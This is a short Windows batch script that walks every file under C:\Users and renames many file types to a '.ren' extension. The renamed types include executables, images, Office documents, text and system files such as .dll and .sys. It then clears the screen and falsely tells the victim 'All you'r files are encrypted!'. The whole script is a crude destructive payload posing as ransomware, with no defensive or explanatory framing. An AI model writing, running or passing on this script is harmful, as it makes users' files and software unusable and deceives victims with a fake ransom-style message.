@echo off
cd C:\Users
FOR /R %f IN (*.vbs) DO REN "%f" *.ren
FOR /R %f IN (*.exe) DO REN "%f" *.ren
FOR /R %f IN (*.png) DO REN "%f" *.ren
FOR /R %f IN (*.xlsx) DO REN "%f" *.ren
FOR /R %f IN (*.pptx) DO REN "%f" *.ren
FOR /R %f IN (*.txt) DO REN "%f" *.ren
FOR /R %f IN (*.jpg) DO REN "%f" *.ren
FOR /R %f IN (*.jpeg) DO REN "%f" *.ren
FOR /R %f IN (*.bat) DO REN "%f" *.ren
FOR /R %f IN (*.jpeg) DO REN "%f" *.ren
FOR /R %f IN (*.html) DO REN "%f" *.ren
FOR /R %f IN (*.lnk) DO REN "%f" *.ren
FOR /R %f IN (*.c) DO REN "%f" *.ren
FOR /R %f IN (*.com) DO REN "%f" *.ren
FOR /R %f IN (*.reg) DO REN "%f" *.ren
FOR /R %f IN (*.sys) DO REN "%f" *.ren
FOR /R %f IN (*.dll) DO REN "%f" *.ren
FOR /R %f IN (*.ini) DO REN "%f" *.ren
FOR /R %f IN (*.inf) DO REN "%f" *.ren
cls
echo All you'r files are encrypted!
